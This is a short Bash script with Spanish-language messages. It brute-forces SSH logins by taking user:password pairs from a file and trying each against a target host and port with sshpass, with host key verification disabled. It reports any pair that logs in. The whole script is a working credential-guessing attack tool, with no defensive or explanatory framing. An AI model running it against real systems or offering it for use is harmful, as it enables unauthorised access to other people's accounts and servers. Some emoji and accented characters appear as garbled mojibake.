#!/bin/bash

TARGET=$1
CREDENTIALS_FILE=$2
PORT=${3:-22}

# Validaciรณn
if [ -z "$TARGET" ] || [ -z "$CREDENTIALS_FILE" ]; then
    echo "Error: Uso: $0 <target> <credentials_file> [port]" >&2
    exit 1
fi

if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Archivo '$CREDENTIALS_FILE' no encontrado" >&2
    exit 1
fi

echo "๐ Iniciando SSH bruteforce"
echo "๐ฏ Target: $TARGET:$PORT"
echo "โโโโโโโโโโโโโโโโโโโโโโโโโโ"

SUCCESS=false

while IFS=':' read -r USER PASSWORD; do
    [[ -z "$USER" || "$USER" =~ ^# ]] && continue
    
    USER=$(echo "$USER" | xargs)
    PASSWORD=$(echo "$PASSWORD" | xargs)
    
    echo "๐ Probando: $USER"
    
    if sshpass -p "$PASSWORD" ssh -p "$PORT" -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$USER@$TARGET" "exit" 2>/dev/null; then
        echo "โโโโโโโโโโโโโโโโโโโโโโโโโโ"
        echo "โ CREDENCIALES VรLIDAS:"
        echo "   Usuario: $USER"
        echo "   Password: $PASSWORD"
        echo "โโโโโโโโโโโโโโโโโโโโโโโโโโ"
        SUCCESS=true
        break
    fi
done < "$CREDENTIALS_FILE"

if [ "$SUCCESS" = false ]; then
    echo "โ No se encontraron credenciales vรกlidas"
    exit 1
fi

exit 0